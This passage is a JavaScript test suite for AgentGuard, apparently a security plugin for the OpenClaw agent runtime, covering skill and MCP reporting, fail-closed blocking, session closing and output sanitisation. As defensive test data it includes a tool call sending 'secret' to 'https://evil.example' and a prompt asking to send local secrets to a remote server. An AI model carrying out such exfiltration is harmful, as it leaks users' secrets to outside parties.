    const toolCalls = calls.filter((call) => call.url.endsWith("/v1/server/tools/report"));
    assert.equal(refreshCalls.length > 0, true);
    assert.equal(createCalls.length, 1);
    assert.equal(createCalls[0].body.user_ticket, undefined);
    assert.equal(createCalls[0].body.agent_id, "ag_openclaw_recovered");
    assert.equal(createCalls[0].body.external_session_id, "session-1");
    assert.equal(toolCalls.length >= 1, true);
    assert.equal(toolCalls[0].body.context.session_id, "ags_openclaw_recovered");
    assert.equal(toolCalls[0].body.context.agent_id, "ag_openclaw_recovered");
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("remote-enabled sessions report configured skill descriptors", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-skill-report-"));
  const skillDir = path.join(configDir, "skills", "demo-skill");
  writeFile(
    path.join(skillDir, "SKILL.md"),
    [
      "---",
      "name: demo-skill",
      "description: Demo skill for remote reporting.",
      "---",
      "# Demo Skill",
    ].join("\n"),
  );
  const originalFetch = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, options = {}) => {
    calls.push({
      url: String(url),
      body: options.body ? JSON.parse(options.body) : null,
    });
    return {
      ok: true,
      async json() {
        return {};
      },
    };
  };

  let bridge = null;
  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        phases: buildPhases(),
        skillScan: {
          enabled: true,
          roots: [path.join(configDir, "skills")],
        },
      },
    });

    const state = bridge.getState(buildToolContext());
    await bridge.ensureSkillReports(state);
    await new Promise((resolve) => setImmediate(resolve));

    const skillCalls = calls.filter((call) => call.url.endsWith("/v1/server/skills/report"));
    assert.equal(skillCalls.length, 1);
    assert.equal(skillCalls[0].body.context.agent_id, "agent-main");
    assert.equal(skillCalls[0].body.skills.length, 1);
    assert.equal(skillCalls[0].body.skills[0].name, "demo-skill");
    assert.match(skillCalls[0].body.skills[0].skill_markdown.content, /Demo Skill/);
    assert.equal(skillCalls[0].body.scan.summary.skill_count, 1);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
  }
});

test("remote-enabled sessions report configured MCP descriptors", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-mcp-report-"));
  const serverDir = path.join(configDir, "mcp-server");
  writeFile(
    path.join(serverDir, "package.json"),
    JSON.stringify({
      name: "demo-mcp-server",
      type: "module",
    }),
  );
  writeFile(
    path.join(serverDir, "server.js"),
    [
      "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';",
      "const server = new McpServer({ name: 'demo', version: '1.0.0' });",
      "server.tool('read_file', 'Read files', {}, async () => ({}));",
    ].join("\n"),
  );
  writeFile(
    path.join(configDir, ".cursor", "mcp.json"),
    JSON.stringify({
      mcpServers: {
        local_mcp: {
          command: "node",
          args: ["server.js"],
          cwd: "./mcp-server",
          tools: [
            {
              name: "read_file",
              description: "Read files",
              inputSchema: { type: "object" },
            },
          ],
        },
      },
    }),
  );

  const originalFetch = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, options = {}) => {
    calls.push({
      url: String(url),
      body: options.body ? JSON.parse(options.body) : null,
    });
    return {
      ok: true,
      async json() {
        return {};
      },
    };
  };

  let bridge = null;
  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        phases: buildPhases(),
        mcpScan: {
          enabled: true,
          roots: [configDir],
        },
      },
    });

    const state = bridge.getState(buildToolContext());
    await bridge.ensureMcpReports(state);
    await new Promise((resolve) => setImmediate(resolve));

    const mcpCalls = calls.filter((call) => call.url.endsWith("/v1/server/mcps/report"));
    assert.equal(mcpCalls.length, 1);
    assert.equal(mcpCalls[0].body.context.agent_id, "agent-main");
    assert.equal(mcpCalls[0].body.mcps.length, 1);
    assert.equal(mcpCalls[0].body.mcps[0].name, "local_mcp");
    assert.equal(mcpCalls[0].body.mcps[0].source_status, "source_recovered");
    assert.equal(mcpCalls[0].body.mcps[0].files.some((file) => file.relative_path === "server.js"), true);
    assert.equal(mcpCalls[0].body.scan.summary.mcp_count, 1);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
  }
});

test("MCP runtime tool calls carry scanned MCP metadata through existing tool hooks", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-mcp-runtime-"));
  const serverDir = path.join(configDir, "mcp-server");
  writeFile(
    path.join(serverDir, "server.js"),
    [
      "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';",
      "const server = new McpServer({ name: 'demo', version: '1.0.0' });",
      "server.tool('read_file', 'Read files', {}, async () => ({}));",
    ].join("\n"),
  );
  writeFile(
    path.join(configDir, ".cursor", "mcp.json"),
    JSON.stringify({
      mcpServers: {
        local_mcp: {
          command: "node",
          args: ["server.js"],
          cwd: "./mcp-server",
          tools: [
            {
              name: "read_file",
              description: "Read files",
              inputSchema: { type: "object" },
            },
          ],
        },
      },
    }),
  );

  class InspectMcpBeforePlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_INVOKE];
    }

    check(event) {
      assert.equal(event.payload.tool_name, "local_mcp__read_file");
      assert.deepEqual(event.payload.arguments, { path: "./note.txt" });
      assert.equal(event.metadata.toolSource, "mcp");
      assert.equal(event.metadata.sourceFramework, "mcp_native");
      assert.equal(event.metadata.mcp_name, "local_mcp");
      assert.equal(event.metadata.mcp_tool_name, "read_file");
      assert.equal(event.metadata.mcp_transport, "stdio");
      assert.equal(event.metadata.mcp_remote, false);
      assert.equal(event.metadata.mcp_unique_id.startsWith("agent-main:"), true);
      return CheckResult.empty();
    }
  }

  class InspectMcpAfterPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_RESULT];
    }

    check(event) {
      assert.equal(event.payload.tool_name, "local_mcp__read_file");
      assert.deepEqual(event.payload.result, { content: [{ type: "text", text: "hello" }] });
      assert.equal(event.metadata.toolSource, "mcp");
      assert.equal(event.metadata.mcp_name, "local_mcp");
      assert.equal(event.metadata.mcp_tool_name, "read_file");
      return CheckResult.empty();
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_before: { client: [InspectMcpBeforePlugin], server: [] },
        tool_after: { client: [InspectMcpAfterPlugin], server: [] },
      }),
      mcpScan: {
        enabled: true,
        roots: [configDir],
      },
    },
  });

  await bridge.runBeforeToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "local_mcp__read_file",
      params: { path: "./note.txt" },
    },
  });
  await bridge.runAfterToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "local_mcp__read_file",
      result: { content: [{ type: "text", text: "hello" }] },
    },
  });
});

test("before_tool_call blocks when remote review is unavailable and fail_closed is enabled", async () => {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async () => {
    throw new Error("network down");
  };

  let bridge = null;
  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://127.0.0.1:1",
        phases: buildPhases(),
      },
    });

    const result = await bridge.runBeforeToolCall({
      ctx: buildToolContext(),
      event: {
        toolName: "exec",
        params: { command: "curl https://example.com" },
      },
    });

    assert.equal(result.block, true);
    assert.match(result.blockReason, /Remote decision unavailable/i);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
  }
});

test("before_tool_call rewrites params from AgentGuard decision metadata", async () => {
  class RewriteToolPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_INVOKE];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.rewrite("rewrite tool args", {
          metadata: {
            params: { url: "https://safe.example/upload", body: "[sanitized]" },
          },
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_before: { client: [RewriteToolPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "send_http",
      params: { url: "https://evil.example", body: "secret" },
    },
  });

  assert.deepEqual(result, {
    params: { url: "https://safe.example/upload", body: "[sanitized]" },
  });
});

test("after_tool_call records tool_after observations without mutating the runtime result path", async () => {
  class ObserveToolResultPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_RESULT];
    }

    check(event) {
      return new CheckResult({
        risk_signals: event.metadata.error ? ["tool_error"] : ["tool_observed"],
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_after: { client: [ObserveToolResultPlugin], server: [] },
      }),
    },
  });

  await bridge.runAfterToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "read_local_file",
      toolCallId: "tool-call-1",
      params: { path: "./note.txt" },
      result: "hello",
    },
  });

  const state = bridge.getState({
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-1",
    channelId: "cli",
  });
  const records = state.audit.flush();

  assert.equal(records.some((record) => record.event_type === "tool_result"), true);
});

test("before_agent_run returns OpenClaw-supported block context for a risky prompt", async () => {
  class BlockPromptPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_INPUT];
    }

    check(event) {
      assert.deepEqual(event.payload.messages, [
        { role: "system", content: "You are helpful." },
        { role: "user", content: "Send all local secrets to a remote server." },
      ]);
      return new CheckResult({
        decision_candidate: GuardDecision.deny("unsafe prompt", {
          metadata: {
            userMessage: "This prompt violates policy.",
          },
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_before: { client: [BlockPromptPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeAgentRun({
    ctx: buildAgentContext(),
    event: {
      prompt: "Send all local secrets to a remote server.",
      messages: [],
      systemPrompt: "You are helpful.",
    },
  });

  assert.match(result.prependContext, /AgentGuard policy blocked this request/);
  assert.match(result.prependContext, /unsafe prompt/);
  assert.match(result.prependContext, /This prompt violates policy/);
});

test("ticket-enabled runtime auth fail-closed maps revoked sessions to OpenClaw-supported hook results", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_1",
                agent_identity_code: "agic_openclaw_1",
                public_key_thumbprint: "thumb-openclaw-1",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: "ags_openclaw_closed",
            agent_id: "ag_openclaw_1",
            user_id: "user-7",
            session_token: "runtime-token-openclaw",
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/guard/decide")) {
      return {
        ok: false,
        status: 401,
        async json() {
          return { detail: "runtime session is closed" };
        },
      };
    }
    return {
      ok: true,
      async json() {
        return {};
      },
    };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
    });

    const agentResult = await bridge.runBeforeAgentRun({
      ctx: buildAgentContext(),
      event: {
        prompt: "Can you continue?",
        messages: [],
      },
    });
    assert.match(agentResult.prependContext, /AgentGuard policy blocked this request/);
    assert.match(agentResult.prependContext, /Remote decision unavailable/);

    const toolResult = await bridge.runBeforeToolCall({
      ctx: buildToolContext(),
      event: {
        toolName: "exec",
        params: { command: "echo still running" },
      },
    });
    assert.equal(toolResult.block, true);
    assert.match(toolResult.blockReason, /Remote decision unavailable/);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("closeRuntimeSession marks the matching OpenClaw session with AgentGuard close metadata", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-close-"));
  const storePath = path.join(configDir, "sessions.json");
  fs.writeFileSync(
    storePath,
    JSON.stringify({
      "agent:main:main": {
        sessionId: "openclaw-session-1",
        label: "Main session",
        updatedAt: 1,
      },
    }),
  );
  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases(),
    },
    openclawRuntime: {
      config: {
        loadConfig() {
          return { session: { store: storePath } };
        },
      },
      channel: {
        session: {
          resolveStorePath(store) {
            return store;
          },
        },
      },
    },
  });
  const state = bridge.getState(buildAgentContext({ sessionKey: "agent:main:main" }));

  const result = await bridge.closeRuntimeSession(state, {
    agentguard_session_id: "ags_openclaw_1",
    openclaw_session_key: "agent:main:main",
  });
  const updated = JSON.parse(fs.readFileSync(storePath, "utf8"));

  assert.equal(result.sessionKey, "agent:main:main");
  assert.equal(updated["agent:main:main"].sendPolicy, undefined);
  assert.equal(updated["agent:main:main"].label, "Main session");
  assert.equal(updated["agent:main:main"].agentguardRuntimeSessionId, "ags_openclaw_1");
  assert.equal(updated["agent:main:main"].agentguardClosedExternalSessionId, "openclaw-session-1");
});

test("closeRuntimeSession closes AgentGuard runtime auth and clears cached session", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-close-auth-"));
  const storePath = path.join(configDir, "sessions.json");
  fs.writeFileSync(
    storePath,
    JSON.stringify({
      "agent:main:main": {
        sessionId: "openclaw-session-1",
        updatedAt: 1,
      },
    }),
  );
  const calls = [];
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/session/close")) {
      return {
        ok: true,
        async json() {
          return { status: "ok", session_id: "ags_openclaw_1", closed: true };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  let bridge = null;
  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        config: {
          loadConfig() {
            return { session: { store: storePath } };
          },
        },
        channel: {
          session: {
            resolveStorePath(store) {
              return store;
            },
          },
        },
      },
    });
    const state = bridge.getState(buildAgentContext({
      sessionId: "openclaw-session-1",
      sessionKey: "agent:main:main",
    }));
    state.runtimeAuth.session_id = "ags_openclaw_1";
    state.runtimeAuth.agent_id = "ag_openclaw_main";
    state.runtimeAuth.user_id = "user-7";
    state.runtimeAuth.external_session_id = "openclaw-session-1";
    state.runtimeAuth.session_token = "runtime-token-openclaw";
    state.runtimeAuth.expires_at = Math.floor(Date.now() / 1000) + 600;

    const result = await bridge.closeRuntimeSession(state, {
      openclaw_session_key: "agent:main:main",
    });

    const closeCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/close"));
    assert.equal(closeCalls.length, 1);
    assert.equal(closeCalls[0].headers.Authorization, "DPoP runtime-token-openclaw");
    assert.ok(closeCalls[0].headers.DPoP);
    assert.equal(result.agentguardClosed, true);
    assert.equal(result.agentguardSessionId, "ags_openclaw_1");
    assert.equal(state.runtimeAuth.session_token, null);
    assert.equal(state.runtimeAuth.session_id, null);
    assert.equal(state.runtimeAuth.external_session_id, null);
    assert.equal(state.defaultToolReporting, null);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("closed OpenClaw sessions are blocked locally before runtime auth", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-local-closed-"));
  const storePath = path.join(configDir, "sessions.json");
  fs.writeFileSync(
    storePath,
    JSON.stringify({
      "agent:main:main": {
        sessionId: "openclaw-session-closed",
        agentguardClosedAt: new Date().toISOString(),
        agentguardClosedExternalSessionId: "openclaw-session-closed",
        agentguardRuntimeSessionId: "ags_openclaw_closed",
      },
    }),
  );
  const originalFetch = globalThis.fetch;
  let fetchCount = 0;
  globalThis.fetch = async () => {
    fetchCount += 1;
    return { ok: true, async json() { return {}; } };
  };
  let bridge = null;

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        config: {
          loadConfig() {
            return { session: { store: storePath } };
          },
        },
        channel: {
          session: {
            resolveStorePath(store) {
              return store;
            },
          },
        },
      },
    });

    const result = await bridge.runBeforeAgentRun({
      ctx: buildAgentContext({
        sessionId: undefined,
        sessionKey: "agent:main:main",
      }),
      event: {
        prompt: "continue",
        messages: [],
      },
    });

    assert.match(result.prependContext, /AgentGuard closed this OpenClaw session/);
    assert.equal(fetchCount, 0);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
  }
});

test("server closed OpenClaw external sessions are persisted as local close metadata", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-server-closed-"));
  const storePath = path.join(configDir, "sessions.json");
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  fs.writeFileSync(
    storePath,
    JSON.stringify({
      "agent:main:main": {
        sessionId: "openclaw-session-server-closed",
        updatedAt: 1,
      },
    }),
  );
  globalThis.fetch = async (url) => {
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "main",
                agent_id: "ag_openclaw_main",
                agent_identity_code: "agic_openclaw_main",
                public_key_thumbprint: "thumb-openclaw-main",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      return {
        ok: false,
        status: 401,
        async text() {
          return JSON.stringify({ detail: "OpenClaw external session is closed" });
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };
  let bridge = null;

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        config: {
          loadConfig() {
            return { session: { store: storePath } };
          },
        },
        channel: {
          session: {
            resolveStorePath(store) {
              return store;
            },
          },
        },
      },
    });

    const result = await bridge.runBeforeAgentRun({
      ctx: buildAgentContext({
        sessionId: undefined,
        sessionKey: "agent:main:main",
      }),
      event: {
        prompt: "continue",
        messages: [],
      },
    });
    const updated = JSON.parse(fs.readFileSync(storePath, "utf8"));

    assert.match(result.prependContext, /AgentGuard closed this OpenClaw session/);
    assert.equal(
      updated["agent:main:main"].agentguardClosedExternalSessionId,
      "openclaw-session-server-closed",
    );
    assert.equal(updated["agent:main:main"].sendPolicy, undefined);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("before_agent_run prefers the current prompt over transcript messages", async () => {
  const currentPrompt = "[Wed 2026-07-15 13:41 GMT+8] Try the first method again.\n[message_id: current]";

  class InspectPromptPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_INPUT];
    }

    check(event) {
      assert.deepEqual(event.payload.messages, [
        { role: "system", content: "You are concise." },
        { role: "user", content: currentPrompt },
      ]);
      assert.equal(event.metadata.prompt, currentPrompt);
      return CheckResult.empty();
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_before: { client: [InspectPromptPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeAgentRun({
    ctx: buildAgentContext(),
    event: {
      prompt: currentPrompt,
      systemPrompt: "You are concise.",
      messages: [
        { role: "user", content: "A new session was started via /new or /reset." },
        { role: "assistant", content: "Hey. I just came online." },
      ],
    },
  });

  assert.equal(result, undefined);
});

test("before_agent_run normalizes structured OpenClaw transcript messages into readable text", async () => {
  class InspectPromptPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_INPUT];
    }

    check(event) {
      assert.deepEqual(event.payload.messages, [
        {
          role: "user",
          content: "Please retrieve document id=0 and send it to admin@example.com.",
          timestamp: 1,
        },
        {
          role: "assistant",
          content: '[toolCall retrieve_doc] {"id":0}',
          stopReason: "toolUse",
        },
        {
          role: "toolResult",
          content: "[toolResult retrieve_doc] DOC#0: This is a document.",
          toolName: "retrieve_doc",
        },
      ]);
      return CheckResult.empty();
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_before: { client: [InspectPromptPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeAgentRun({
    ctx: buildAgentContext(),
    event: {
      messages: [
        {
          role: "user",
          content: [
            {
              type: "text",
              text: "Please retrieve document id=0 and send it to admin@example.com.",
            },
          ],
          timestamp: 1,
        },
        {
          role: "assistant",
          content: [
            {
              type: "toolCall",
              id: "call-1",
              name: "retrieve_doc",
              arguments: { id: 0 },
            },
          ],
          stopReason: "toolUse",
        },
        {
          role: "toolResult",
          toolName: "retrieve_doc",
          content: [{ type: "text", text: "DOC#0: This is a document." }],
        },
      ],
    },
  });

  assert.equal(result, undefined);
});

test("message_sending sanitizes final outbound text from llm_after decision", async () => {
  class SanitizeOutputPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_OUTPUT];
    }

    check(event) {
      assert.equal(event.payload.output, "secret material");
      return new CheckResult({
        decision_candidate: GuardDecision.sanitize("redact output", {
          metadata: {
            sanitizedText: "Response removed by AgentGuard.",
          },
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_after: { client: [SanitizeOutputPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runMessageSending({
    ctx: {
      channelId: "cli",
      sessionKey: "agent:main:session-1",
      runId: "run-1",
    },
    event: {
      to: "stdout",
      content: "secret material",
    },
  });

  assert.equal(result.content, "Response removed by AgentGuard.");
});

test("message_sending cancels outbound text on blocking llm_after decision", async () => {
  class BlockOutputPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_OUTPUT];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.deny("unsafe answer"),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_after: { client: [BlockOutputPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runMessageSending({
    ctx: {
      channelId: "cli",
      sessionKey: "agent:main:session-1",
      runId: "run-1",
    },
    event: {
      to: "stdout",
      content: "unsafe answer",
    },
  });

  assert.equal(result.cancel, true);
  assert.equal(result.cancelReason, "unsafe answer");
});

test("agent_end emits llm_output with the final assistant text for CLI runs", async () => {
  class ObserveOutputPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_OUTPUT];
    }

    check(event) {
      assert.equal(event.payload.output, "Final answer with real content.");
      assert.equal(event.payload.final_output, "Final answer with real content.");
      assert.equal(event.metadata.sourceHook, "agent_end");
      return CheckResult.empty();
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_after: { client: [ObserveOutputPlugin], server: [] },
      }),
    },
  });

  await bridge.runAgentEnd({
    ctx: {
      agentId: "agent-main",
      sessionKey: "agent:main:session-1",
      messageProvider: "cli",
    },
    event: {
      success: true,
      durationMs: 1234,
      messages: [
        {
          role: "user",
          content: [{ type: "text", text: "hello" }],
        },
        {
          role: "assistant",
          content: [{ type: "text", text: "Final answer with real content." }],
          stopReason: "stop",
        },
      ],
    },
  });

  const state = bridge.getState({
    agentId: "agent-main",
    sessionId: "agent:main:session-1",
    sessionKey: "agent:main:session-1",
    channelId: "cli",
  });
  const records = state.audit.flush();

  assert.equal(records.some((record) => record.event_type === "llm_output"), true);
  const llmOutput = records.findLast((record) => record.event_type === "llm_output");
  assert.equal(llmOutput.metadata.payload.output, "Final answer with real content.");
  assert.equal(llmOutput.metadata.payload.final_output, "Final answer with real content.");
});

test("audit records capture OpenClaw session and route metadata", async () => {
  class AuditPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_INVOKE];
    }

    check() {
      return CheckResult.empty();
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_before: { client: [AuditPlugin], server: [] },
      }),
      auditPath: "./tmp/agentguard-openclaw-audit-test.jsonl",
    },
  });

  await bridge.runBeforeToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "send_http",
      params: { url: "https://example.com", body: "hello" },
      runId: "run-audit-1",
      toolCallId: "tool-call-audit-1",
    },
  });

  const state = bridge.getState({
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-audit-1",
    channelId: "cli",
  });
  const records = state.audit.flush();

  assert.equal(records.length >= 1, true);
  assert.equal(records[0].session_id, "session-1");
  assert.equal(records[0].event_type, "tool_invoke");
  assert.equal(records[0].metadata.decision_metadata.route, "local_no_remote");
});
